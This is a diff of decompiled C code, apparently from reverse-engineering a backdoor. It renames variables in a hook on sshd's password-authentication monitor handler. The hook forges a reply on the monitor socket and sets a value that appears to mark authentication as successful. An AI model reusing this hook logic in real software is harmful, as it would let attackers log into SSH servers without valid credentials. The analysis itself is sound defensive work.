@@ -17,43 +17,42 @@
 int mm_answer_authpassword_hook(ssh *ssh,int sock,sshbuf *m)
 
 {
-  libc_imports_t *funcs;
-  long lVar1;
-  int iVar2;
+  libc_imports_t *libc_imports;
+  sshd_payload_ctx_t *payload_ctx;
+  int result;
   size_t reply_len;
   void *reply_buf;
-  uint *auth_reply;
-  sshd_payload_ctx_t *payload_ctx;
-  libc_imports_t *libc_imports;
+  uint local_15;
+  uint uStack_11;
   undefined1 uStack_d;
   undefined4 uStack_c;
   
-  *(uint *)&libc_imports = 0;
-  funcs = *(libc_imports_t **)(global_ctx + 0x10);
-  lVar1 = *(long *)(global_ctx + 0x20);
-  *(uint *)((u8 *)&libc_imports + 4) = 0;
+  local_15 = 0;
+  libc_imports = *(libc_imports_t **)(global_ctx + 0x10);
+  payload_ctx = *(long *)(global_ctx + 0x20);
+  uStack_11 = 0;
   uStack_d = 0;
   uStack_c = 0;
   if ((m == (sshbuf *)0x0 || sock < 0) || (ssh == (ssh *)0x0)) {
-    if ((funcs != (libc_imports_t *)0x0) && (funcs->exit != (pfn_exit_t)0x0)) {
-      (*funcs->exit)(0);
+    if ((libc_imports != (libc_imports_t *)0x0) && (libc_imports->exit != (pfn_exit_t)0x0)) {
+      (*libc_imports->exit)(0);
     }
-    iVar2 = 0;
+    result = 0;
   }
   else {
-    reply_len = (size_t)*(ushort *)(lVar1 + 0x90);
-    if ((*(ushort *)(lVar1 + 0x90) == 0) ||
-       (reply_buf = *(libc_imports_t ***)(lVar1 + 0x98), reply_buf == (libc_imports_t **)0x0)) {
-      reply_buf = &libc_imports;
+    reply_len = (size_t)*(ushort *)(payload_ctx + 0x90);
+    if ((*(ushort *)(payload_ctx + 0x90) == 0) ||
+       (reply_buf = *(uint **)(payload_ctx + 0x98), reply_buf == (uint *)0x0)) {
+      reply_buf = &local_15;
       uStack_d = 1;
-      *(uint *)((u8 *)&libc_imports + 4) = *(uint *)(lVar1 + 0x40) & 0xff;
-      *(uint *)&libc_imports = (-(uint)(*(int *)(lVar1 + 0xb8) == 0) & 0xfc000000) + 0x9000000;
-      reply_len = (ulong)((uint)libc_imports >> 0x18) + 4;
+      uStack_11 = *(uint *)(payload_ctx + 0x40) & 0xff;
+      local_15 = (-(uint)(*(int *)(payload_ctx + 0xb8) == 0) & 0xfc000000) + 0x9000000;
+      reply_len = (ulong)(local_15 >> 0x18) + 4;
     }
-    fd_write(sock,reply_buf,reply_len,funcs);
-    **(undefined8 **)(lVar1 + 0xa0) = *(undefined8 *)(lVar1 + 0xd0);
-    iVar2 = 1;
+    fd_write(sock,reply_buf,reply_len,libc_imports);
+    **(undefined8 **)(payload_ctx + 0xa0) = *(undefined8 *)(payload_ctx + 0xd0);
+    result = 1;
   }
-  return iVar2;
+  return result;
 }
 
